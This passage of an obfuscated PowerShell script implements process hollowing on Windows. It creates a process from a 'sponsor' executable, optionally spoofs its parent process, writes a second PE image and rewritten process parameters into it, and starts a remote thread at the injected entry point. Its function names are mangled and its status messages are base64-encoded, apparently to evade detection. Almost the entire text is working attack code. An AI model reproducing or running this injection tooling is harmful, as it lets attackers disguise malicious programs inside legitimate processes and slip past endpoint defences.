rAEMAbwBtAG0AaQB0ACwADQAKAAkACQAJAFUASQBuAHQAMwAyACAAUwBpAHoAZQBPAGYAUwB0AGEAYwBrAFIAZQBzAGUAcgB2AGUALAANAAoACQAJAAkASQBuAHQAUAB0AHIAIABsAHAAQgB5AHQAZQBzAEIAdQBmAGYAZQByACkAOwANAAoACQB9AA==')))
	function ____/===\_/\/==\_/ {
		if ([IntPtr]::Size -eq 4) {
			$PoshIs32 = $true
		} else {
			$PoshIs32 = $false
		}
		if (${Env:ProgramFiles(x86)}) {
			$OsIs32 = $false
		} else {
			$OsIs32 = $true
		}
		try {
			$SponsorPath = (rvpa $Sponsor -ErrorAction Stop).Path
			$HollowPath = (rvpa $Hollow -ErrorAction Stop).Path
			$SponsorArch = ____/===\_/=\/\__/ -Path $SponsorPath
			$HollowArch = ____/===\_/=\/\__/ -Path $HollowPath
		} catch {
			$SponsorPath = $false
			$HollowPath = $false
			$SponsorArch = $false
			$HollowArch = $false
		}
		if ($ParentPID) {
			$GetProc = ps -Id $ParentPID -ErrorAction SilentlyContinue
			if ($GetProc) {
				$ProcIsValid = $true
			} else {
				$ProcIsValid = $false
			}
		} else {
			$ProcIsValid = $true
		}
		$HashTable = @{
			PoshIs32 = $PoshIs32
			OsIs32 = $OsIs32
			SponsorPath = $SponsorPath
			HollowPath = $HollowPath
			SponsorArch = $SponsorArch
			HollowArch = $HollowArch
			ProcIsValid = $ProcIsValid
		}
		New-Object PSObject -Property $HashTable
	}
	function ____/===\_/=\/\__/ {
		param(
			[String]$Path
		)
		try {
			$BinPath = (rvpa $Path -ErrorAction Stop).Path
			$BinBytes = [System.IO.File]::ReadAllBytes($BinPath)
			[Int16]$PEOffset = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAB4AHsAMAB9AA=='))) -f (($BinBytes[63..60] | % {$_.ToString('X2')}) -join '')
			$OptOffset = $PEOffset + 24
			[Int16]$PEArch = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAB4AHsAMAB9AA=='))) -f ((($BinBytes[($OptOffset+1)..($OptOffset)]) | % {$_.ToString('X2')}) -join '')
		} catch {
			$false
			Return
		}
		[Int16]$MZ = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAB4AHsAMAB9AA=='))) -f ((($BinBytes[0..1]) | % {$_.ToString('X2')}) -join '')
		[Int16]$PE = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAB4AHsAMAB9AA=='))) -f ((($BinBytes[($PEOffset)..($PEOffset+1)]) | % {$_.ToString('X2')}) -join '')
		if ($MZ -ne 0x4D5A -Or $PE -ne 0x5045) {
			$false
			Return
		}
		$PEArch 
	}
	function __/=\/\/\/\__/=\/= {
		param(
			[IntPtr]$hProcess
		)
		$PROCESS_BASIC_INFORMATION = New-Object PROCESS_BASIC_INFORMATION
		$PROCESS_BASIC_INFORMATION_Size = [System.Runtime.InteropServices.Marshal]::SizeOf($PROCESS_BASIC_INFORMATION)
		[UInt32]$RetLen = 0
		$CallResult = [Hollow]::NtQueryInformationProcess($hProcess,0,[ref]$PROCESS_BASIC_INFORMATION,$PROCESS_BASIC_INFORMATION_Size, [ref]$RetLen)
		if ($CallResult -ne 0) {
			$false
		} else {
			$PROCESS_BASIC_INFORMATION
		}
	}
	function __/\/=\__/==\/=\__ {
		param(
			[IntPtr]$pHollow,
			[Int16]$PEArch
		)
		$e_lfanew = [System.Runtime.InteropServices.Marshal]::ReadInt32($($pHollow.ToInt64() + 0x3C))
		$ImageFileHeader = $pHollow.ToInt64() + $e_lfanew
		[UInt16]$SectionCount = [System.Runtime.InteropServices.Marshal]::ReadInt16($($ImageFileHeader + 0x6))
		[UInt32]$SizeOfOptionalHeader = [System.Runtime.InteropServices.Marshal]::ReadInt16($($ImageFileHeader + 0x14))
		$OptionalHeader = $ImageFileHeader + 0x18
		$SectionHeadersOffset = $OptionalHeader + $SizeOfOptionalHeader
		[UInt32]$EntryPoint = [System.Runtime.InteropServices.Marshal]::ReadInt32($($OptionalHeader + 0x10))
		[UInt32]$BaseOfCode = [System.Runtime.InteropServices.Marshal]::ReadInt32($($OptionalHeader + 0x14))
		if ($PEArch -eq 0x010b) {
			[UInt32]$ImageBase = [System.Runtime.InteropServices.Marshal]::ReadInt32($($OptionalHeader + 0x1C))
		} else {
			[UInt64]$ImageBase = [System.Runtime.InteropServices.Marshal]::ReadInt32($($OptionalHeader + 0x18))
		}
		[UInt32]$SizeOfImage = [System.Runtime.InteropServices.Marshal]::ReadInt32($($OptionalHeader + 0x38))
		[UInt32]$SizeOfHeaders = [System.Runtime.InteropServices.Marshal]::ReadInt32($($OptionalHeader + 0x3C))
		$HashTable = @{
			SectionCount = $SectionCount
			pSectionHeaders = $SectionHeadersOffset
			EntryPoint = $EntryPoint
			BaseOfCode = $BaseOfCode
			ImageBase = $ImageBase
			SizeOfImage = $SizeOfImage
			SizeOfHeaders = $SizeOfHeaders
		}
		New-Object PSObject -Property $HashTable
	}
	function _/=\/===\/\/\_/\/\ {
		param(
			[IntPtr]$hProcess,
			[IntPtr]$pSource,
			[IntPtr]$pDestination,
			$CopySize,
			$ProtectSize,
			$Protect
		)
		[UInt32]$BytesWritten = 0
		$CallResult = [Hollow]::WriteProcessMemory($hProcess,$pDestination,$pSource,$CopySize,[ref]$BytesWritten)
		if (!$CallResult) {
			Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwAhAF0AIABGAGEAaQBsAGUAZAAgAHQAbwAgAHcAcgBpAHQAZQAgAHMAZQBjAHQAaQBvAG4AIABtAGUAbQBvAHIAeQA=')))
			$false
			Return
		}
		[UInt32]$OldProtect = 0
		$CallResult = [Hollow]::VirtualProtectEx($hProcess,$pDestination,$ProtectSize,$Protect,[ref]$OldProtect)
		if (!$CallResult) {
			Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwAhAF0AIABGAGEAaQBsAGUAZAAgAHQAbwAgAHMAZQB0ACAAcwBlAGMAdABpAG8AbgAgAG0AZQBtAG8AcgB5ACAAYQB0AHQAcgBpAGIAdQB0AGUAcwA=')))
			$false
			Return
		}
		$true
	}
	function __/=====\__/=====\ {
		param(
			$hProcess,
			$rPEB
		)
		$uTargetPath = ___/====\/==\/\_/= -Data $Runtime.SponsorPath
		$uDllDir = ___/====\/==\/\_/= -Data $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwA6AFwAVwBpAG4AZABvAHcAcwBcAFMAeQBzAHQAZQBtADMAMgA=')))
		$uCurrentDir = ___/====\/==\/\_/= -Data $(Split-Path $Runtime.SponsorPath -Parent)
		$uWindowName = ___/====\/==\/\_/= -Data $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SABvAGwAbABvAHcA')))
		$pProcessParameters = [IntPtr]::Zero
		$CallResult = [Hollow]::RtlCreateProcessParametersEx([ref]$pProcessParameters,$uTargetPath,$uDllDir,$uCurrentDir,$uTargetPath,[IntPtr]::Zero,$uWindowName,[IntPtr]::Zero,[IntPtr]::Zero,[IntPtr]::Zero,1)
		if ($CallResult -ne 0) {
			$false
			Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwAhAF0AIABGAGEAaQBsAGUAZAAgAHQAbwAgAGMAcgBlAGEAdABlACAAcAByAG8AYwBlAHMAcwAgAHAAYQByAGEAbQBlAHQAZQByAHMA')))
			Return
		} else {
			Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwArAF0AIABDAHIAZQBhAHQAZQBkACAASABvAGwAbABvAHcAIABwAHIAbwBjAGUAcwBzACAAcABhAHIAYQBtAGUAdABlAHIAcwA=')))
		}
		$ProcParamsLength = [System.Runtime.InteropServices.Marshal]::ReadInt32($($pProcessParameters.ToInt64())+4)
		[IntPtr]$HollowProcParams = [Hollow]::VirtualAllocEx($hProcess,$pProcessParameters,$ProcParamsLength,0x3000,0x4)
		if ($HollowProcParams -eq [IntPtr]::Zero) {
			$false
			Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwAhAF0AIABGAGEAaQBsAGUAZAAgAHQAbwAgAGEAbABsAG8AYwBhAHQAZQAgAG0AZQBtAG8AcgB5ACAAaQBuACAAdABoAGUAIABIAG8AbABsAG8AdwA=')))
			Return
		} else {
			Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwArAF0AIABBAGwAbABvAGMAYQB0AGUAZAAgAG0AZQBtAG8AcgB5ACAAaQBuACAAdABoAGUAIABIAG8AbABsAG8AdwA=')))
		}
		$BytesWritten = 0
		$CallResult = [Hollow]::WriteProcessMemory($hProcess,$pProcessParameters,$pProcessParameters,$ProcParamsLength,[ref]$BytesWritten)
		if (!$CallResult) {
			$false
			Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwAhAF0AIABGAGEAaQBsAGUAZAAgAHQAbwAgAHcAcgBpAHQAZQAgAHAAcgBvAGMAZQBzAHMAIABwAGEAcgBhAG0AZQB0AGUAcgBzACAAdABvACAAdABoAGUAIABIAG8AbABsAG8AdwA=')))
			Return
		} else {
			Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwArAF0AIABQAHIAbwBjAGUAcwBzACAAcABhAHIAYQBtAGUAdABlAHIAcwAgAGQAdQBwAGwAaQBjAGEAdABlAGQAIABpAG4AdABvACAAdABoAGUAIABIAG8AbABsAG8AdwA=')))
		}
		if ($Runtime.SponsorArch -eq 0x010b) {
			[IntPtr]$rProcParamOffset = $rPEB + 0x10
			$WriteSize = 4
			[IntPtr]$lpBuffer = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($WriteSize)
			[System.Runtime.InteropServices.Marshal]::WriteInt32($lpBuffer.ToInt32(),$pProcessParameters.ToInt32())
		} else {
			[IntPtr]$rProcParamOffset = $rPEB + 0x20
			$WriteSize = 8
			[IntPtr]$lpBuffer = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($WriteSize)
			[System.Runtime.InteropServices.Marshal]::WriteInt64($lpBuffer.ToInt64(),$pProcessParameters.ToInt64())
		}
		$BytesWritten = 0
		$CallResult = [Hollow]::WriteProcessMemory($hProcess,$rProcParamOffset,$lpBuffer,$WriteSize,[ref]$BytesWritten)
		if (!$CallResult) {
			$false
			Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwAhAF0AIABGAGEAaQBsAGUAZAAgAHQAbwAgAHIAZQB3AHIAaQB0AGUAIABIAG8AbABsAG8AdwAtAD4AUABFAEIALQA+AHAAUAByAG8AYwBlAHMAcwBQAGEAcgBhAG0AZQB0AGUAcgBzAA==')))
			Return
		} else {
			Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwArAF0AIABSAGUAdwByAG8AdABlACAASABvAGwAbABvAHcALQA+AFAARQBCAC0APgBwAFAAcgBvAGMAZQBzAHMAUABhAHIAYQBtAGUAdABlAHIAcwA=')))
		}
	}
	function ___/====\/==\/\_/= {
		param(
			[String]$Data
		)
		$UnicodeObject = New-Object UNICODE_STRING
		$UnicodeObject_Buffer = $Data
		[UInt16]$UnicodeObject.Length = $UnicodeObject_Buffer.Length*2
		[UInt16]$UnicodeObject.MaximumLength = $UnicodeObject.Length+1
		[IntPtr]$UnicodeObject.Buffer = [System.Runtime.InteropServices.Marshal]::StringToHGlobalUni($UnicodeObject_Buffer)
		[IntPtr]$InMemoryStruct = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(16) 
		[system.runtime.interopservices.marshal]::StructureToPtr($UnicodeObject, $InMemoryStruct, $true)
		$InMemoryStruct
	}
	$Runtime = ____/===\_/\/==\_/
	if ($Runtime.PoshIs32 -eq $true -And $Runtime.OsIs32 -eq $false) {
		Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwAhAF0AIABDAGEAbgBuAG8AdAAgAHAAZQByAGYAbwByAG0AIABwAHIAbwBjAGUAcwBzACAAaABvAGwAbABvAHcAaQBuAGcAIABmAHIAbwBtACAAeAAzADIAIABQAG8AdwBlAHIAUwBoAGUAbABsACAAbwBuACAAeAA2ADQAIABPAFMALgAuAA==')))
		$false
		Return
	}
	if ($Runtime.SponsorPath -eq $false) {
		Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwAhAF0AIABGAGEAaQBsAGUAZAAgAHQAbwAgAHYAYQBsAGkAZABhAHQAZQAgAFMAcABvAG4AcwBvAHIAIABvAHIAIABIAG8AbABsAG8AdwAgAHAAYQByAGEAbQBlAHQAZQByAHMALgAuAA==')))
		$false
		Return
	}
	if ($Runtime.OsIs32 -eq $false -And $Runtime.SponsorArch -eq 0x010b) {
		Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwAhAF0AIABDAGEAbgBuAG8AdAAgAGMAcgBlAGEAdABlACAAeAAzADIAIABoAG8AbABsAG8AdwBlAGQAIABwAHIAbwBjAGUAcwBzACAAbwBuACAAeAA2ADQAIABPAFMALgAuAA==')))
		$false
		Return
	}
	if ($Runtime.SponsorArch -ne $Runtime.HollowArch) {
		Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwAhAF0AIABTAHAAbwBuAHMAbwByACAAYQBuAGQAIABIAG8AbABsAG8AdwAgAGEAcgBjAGgAaQB0AGUAYwB0AHUAcgBlAHMAIABkAG8AIABuAG8AdAAgAG0AYQB0AGMAaAAuAC4A')))
		$false
		Return
	}
	if ($Runtime.ProcIsValid -eq $false) {
		Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwAhAF0AIABJAG4AdgBhAGwAaQBkACAAcABhAHIAZQBuAHQAIABwAHIAbwBjAGUAcwBzACAAcwBlAGwAZQBjAHQAZQBkAC4ALgA=')))
		$false
		Return
	}
	Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwA/AF0AIABBACAAcABsAGEAYwBlACAAdwBoAGUAcgBlACAAcwBvAHUAbABzACAAbQBhAHkAIABtAGUAbgBkACAAeQBvAHUAcgAgAGEAaQBsAGkAbgBnACAAbQBpAG4AZAAuAC4A')))
	[IntPtr]$hFile = [IntPtr]::Zero
	$ObjAttr = New-Object OBJECT_ATTRIBUTES
	$ObjAttr.Length = [System.Runtime.InteropServices.Marshal]::SizeOf($ObjAttr)
	$ObjAttr.ObjectName = ___/====\/==\/\_/= -Data "\??\$($Runtime.SponsorPath)"
	$ObjAttr.Attributes = 0x40 
	$IoStatusBlock = New-Object IO_STATUS_BLOCK
	$CallResult = [Hollow]::NtOpenFile([ref]$hFile,0x1000A1,[ref]$ObjAttr,[ref]$IoStatusBlock,0x5,0x60)
	if (!$CallResult) {
		Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwArAF0AIABPAHAAZQBuAGUAZAAgAGYAaQBsAGUAIABmAG8AcgAgAGEAYwBjAGUAcwBzAA==')))
	} else {
		Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwAhAF0AIABOAHQATwBwAGUAbgBGAGkAbABlACAAZgBhAGkAbABlAGQALgAuAA==')))
		$false
		Return
	}
	$hSection = [IntPtr]::Zero
	$LargeInteger = New-Object LARGE_INTEGER
	$CallResult = [Hollow]::NtCreateSection([ref]$hSection,0xF001F,[IntPtr]::Zero,[ref]$LargeInteger,2,0x1000000,$hFile)
	if (!$CallResult) {
		Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwArAF0AIABDAHIAZQBhAHQAZQBkACAAcwBlAGMAdABpAG8AbgAgAGYAcgBvAG0AIABmAGkAbABlACAAaABhAG4AZABsAGUA')))
	} else {
		Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwAhAF0AIABOAHQAQwByAGUAYQB0AGUAUwBlAGMAdABpAG8AbgAgAGYAYQBpAGwAZQBkAC4ALgA=')))
		$false
		Return
	}
	if ($ParentPID) {
		$hParentPID = [Hollow]::OpenProcess(0x1F0FFF,$false,$ParentPID)
		if ($hParentPID -eq [IntPtr]::Zero) {
			Write-Verbose "[!] Unable to open handle to the specified parent => $($(ps -PID $ParentPID).ProcessName)"
			$false
			Return
		} else {
			Write-Verbose "[+] Opened handle to the parent => $($(ps -PID $ParentPID).ProcessName)"
		}
	} else {
		$hParentPID = [IntPtr]-1
	}
	$hProcess = [IntPtr]::Zero
	$CallResult = [Hollow]::NtCreateProcessEx([ref]$hProcess,0x1FFFFF,[IntPtr]::Zero,$hParentPID,4,$hSection,[IntPtr]::Zero,[IntPtr]::Zero,0)
	if ($hProcess -eq [IntPtr]::Zero) {
		Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwAhAF0AIABOAHQAQwByAGUAYQB0AGUAUAByAG8AYwBlAHMAcwBFAHgAIABmAGEAaQBsAGUAZAAuAC4A')))
		$false
		Return
	} else {
		Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwArAF0AIABDAHIAZQBhAHQAZQBkACAAcAByAG8AYwBlAHMAcwAgAGYAcgBvAG0AIABzAGUAYwB0AGkAbwBuAA==')))
	}
	$ProcessBasicInformation = __/=\/\/\/\__/=\/= -hProcess $hProcess
	if (!$ProcessBasicInformation) {
		Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwAhAF0AIABGAGEAaQBsAGUAZAAgAHQAbwAgAGEAYwBxAHUAaQByAGUAIABQAEIASQA=')))
		$false
		Return
	} else {
		Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwArAF0AIABBAGMAcQB1AGkAcgBlAGQAIABQAEIASQA=')))
	}
	$SponsorPEBAddress = $ProcessBasicInformation.PebBaseAddress.ToInt64()
	if ($Runtime.SponsorArch -eq 0x010b) {
		Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwArAF0AIABTAHAAbwBuAHMAbwByACAAYQByAGMAaABpAHQAZQBjAHQAdQByAGUAIABpAHMAIAB4ADMAMgA=')))
		[IntPtr]$rImgBaseOffset = $SponsorPEBAddress + 0x8
		$ReadSize = 4
	} else {
		Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwArAF0AIABTAHAAbwBuAHMAbwByACAAYQByAGMAaABpAHQAZQBjAHQAdQByAGUAIABpAHMAIAB4ADYANAA=')))
		[IntPtr]$rImgBaseOffset = $SponsorPEBAddress + 0x10
		$ReadSize = 8
	}
	$BytesRead = 0
	[IntPtr]$lpBuffer = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($ReadSize)
	$CallResult = [Hollow]::ReadProcessMemory($hProcess,$rImgBaseOffset,$lpBuffer,$ReadSize,[ref]$BytesRead)
	if ($CallResult -eq 0) {
		$false
		Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwAhAF0AIABGAGEAaQBsAGUAZAAgAHQAbwAgAHIAZQBhAGQAIABTAHAAbwBuAHMAbwByACAAaQBtAGEAZwBlACAAYgBhAHMAZQAgAGYAcgBvAG0AIABQAEUAQgA=')))
		Return
	} else {
		if ($Runtime.SponsorArch -eq 0x010b) {
			$SponsorImageBase = [System.Runtime.InteropServices.Marshal]::ReadInt32($($lpBuffer.ToInt64()))
		} else {
			$SponsorImageBase = [System.Runtime.InteropServices.Marshal]::ReadInt64($($lpBuffer.ToInt64()))
		}
		Write-Verbose "[+] Sponsor ImageBaseAddress => $($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ewAwADoAWAB9AA=='))) -f $SponsorImageBase)"
	}
	$HollowByteArray = [System.IO.File]::ReadAllBytes($Runtime.HollowPath)
	[IntPtr]$pHollow = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($HollowByteArray.Length)
	[System.Runtime.InteropServices.Marshal]::Copy($HollowByteArray, 0, $pHollow, $HollowByteArray.Length)
	$HollowPEProperties = __/\/=\__/==\/=\__ -pHollow $pHollow -PEArch $Runtime.HollowArch
	$SectionArray = @()
	$ImageSectionHeader = (New-Object IMAGE_SECTION_HEADER).GetType()
	for ($i=0; $i -lt $HollowPEProperties.SectionCount; $i++) {
		$pSectionInstance = $HollowPEProperties.pSectionHeaders + $($i*0x28)
		$SectionArray += [System.Runtime.InteropServices.Marshal]::PtrToStructure([IntPtr]$pSectionInstance, [type]$ImageSectionHeader)
	}
	$pRemoteImageBase = [Hollow]::VirtualAllocEx($hProcess,$(New-Object System.Intptr -ArgumentList $HollowPEProperties.ImageBase),$HollowPEProperties.SizeOfImage,0x3000,0x04)
	if ($pRemoteImageBase -eq [IntPtr]::Zero) {
		$false
		Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwAhAF0AIABGAGEAaQBsAGUAZAAgAHQAbwAgAGEAbABsAG8AYwBhAHQAZQAgAG0AZQBtAG8AcgB5ACAAaQBuACAAcgBlAG0AbwB0AGUAIABwAHIAbwBjAGUAcwBzAA==')))
		Return
	} else {
		Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwArAF0AIABBAGwAbABvAGMAYQB0AGUAZAAgAHMAcABhAGMAZQAgAGYAbwByACAAdABoAGUAIABIAG8AbABsAG8AdwAgAHAAcgBvAGMAZQBzAHMA')))
	}
	$flNewProtect = [AllocationProtect]::PAGE_READONLY
	$CallResult = _/=\/===\/\/\_/\/\ -hProcess $hProcess -pSource $pHollow -pDestination $pRemoteImageBase -CopySize $HollowPEProperties.SizeOfHeaders -ProtectSize $HollowPEProperties.BaseOfCode -Protect $flNewProtect
	if (!$CallResult) {
		$false
		Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwAhAF0AIABGAGEAaQBsAGUAZAAgAHQAbwAgAGQAdQBwAGwAaQBjAGEAdABlACAASABvAGwAbABvAHcAIABQAEUAIABoAGUAYQBkAGUAcgBzAA==')))
		Return
	} else {
		Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwArAF0AIABEAHUAcABsAGkAYwBhAHQAZQBkACAASABvAGwAbABvAHcAIABQAEUAIABoAGUAYQBkAGUAcgBzACAAdABvACAAdABoAGUAIABTAHAAbwBuAHMAbwByAA==')))
	}
	$SectionArray | % {
		$ProtectSuccess = $true
		$IsRead = $($_.Characteristics -band [SectionFlags]::MEM_READ)
		$IsWrite = $($_.Characteristics -band [SectionFlags]::MEM_WRITE)
		$IsExecute = $($_.Characteristics -band [SectionFlags]::MEM_EXECUTE)
		if ($IsRead -And !$IsWrite -And !$IsExecute) {
			$flNewProtect = [AllocationProtect]::PAGE_READONLY
		} elseif ($IsRead -And $IsWrite -And !$IsExecute) {
			$flNewProtect = [AllocationProtect]::PAGE_READWRITE
		} elseif ($IsRead -And $IsWrite -And $IsExecute) {
			$flNewProtect = [AllocationProtect]::PAGE_EXECUTE_READWRITE
		} elseif ($IsRead -And !$IsWrite -And $IsExecute) {
			$flNewProtect = [AllocationProtect]::PAGE_EXECUTE_READ
		} elseif (!$IsRead -And !$IsWrite -And $IsExecute) {
			$flNewProtect = [AllocationProtect]::PAGE_EXECUTE
		} else {
			$ProtectSuccess = $false
			break
		}
		$pVirtualSectionBase = [IntPtr]($pRemoteImageBase.ToInt64() + $_.VirtualAddress)
		$pRawSectionBase = [IntPtr]($pHollow.ToInt64() + $_.PointerToRawData)
		$CallResult = _/=\/===\/\/\_/\/\ -hProcess $hProcess -pSource $pRawSectionBase -pDestination $pVirtualSectionBase -CopySize $_.SizeOfRawData -ProtectSize $_.VirtualSize -Protect $flNewProtect
		if (!$CallResult) {
			$false
			Write-Verbose "[!] Failed to duplicate section: $($_.Name)"
			Return
		} else {
			Write-Verbose "[+] Duplicated $($_.Name) section to the Sponsor"
		}
	}
	if (!$ProtectSuccess) {
		Write-Verbose "[!] We don't know about this section flag: $($_.Characteristics)"
		Return
	}
	$NewImageBase = [System.BitConverter]::GetBytes($HollowPEProperties.ImageBase)
	$pNewImageBase = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(8) 
	[System.Runtime.InteropServices.Marshal]::Copy($NewImageBase, 0, $pNewImageBase, $NewImageBase.Length)
	[UInt32]$BytesWritten = 0
	$CallResult = [Hollow]::WriteProcessMemory($hProcess,$rImgBaseOffset,$pNewImageBase,$ReadSize,[ref]$BytesWritten)
	if (!$CallResult) {
		$false
		Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwAhAF0AIABGAGEAaQBsAGUAZAAgAHQAbwAgAG8AdgBlAHIAdwByAGkAdABlACAAUABFAEIALQA+AEkAbQBhAGcAZQBCAGEAcwBlAEEAZABkAHIAZQBzAHMA')))
		Return
	} else {
		Write-Verbose "[+] New process ImageBaseAddress => $($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ewAwADoAWAB9AA=='))) -f $HollowPEProperties.ImageBase)"
	}
	$CallResult = __/=====\__/=====\ -hProcess $hProcess -rPEB $SponsorPEBAddress
	$hRemoteThread = [IntPtr]::Zero
	$lpStartAddress = New-Object System.Intptr -ArgumentList $($HollowPEProperties.ImageBase + $HollowPEProperties.EntryPoint)
	$CallResult = [Hollow]::NtCreateThreadEx([ref]$hRemoteThread,0x1FFFFF,[IntPtr]::Zero,$hProcess,[IntPtr]$lpStartAddress,[IntPtr]::Zero,$false,0,0,0,[IntPtr]::Zero)
	if ($CallResult -ne 0) {
		Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwAhAF0AIABOAHQAQwByAGUAYQB0AGUAVABoAHIAZQBhAGQARQB4ACAAZgBhAGkAbABlAGQALgAuAA==')))
		$false
		Return
	} else {
		Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwArAF0AIABDAHIAZQBhAHQAZQBkACAASABvAGwAbABvAHcAIABtAGEAaQBuACAAdABoAHIAZQBhAGQALgAuAA==')))
		$true
	}
	[System.Runtime.InteropServices.Marshal]::FreeHGlobal($pHollow)
}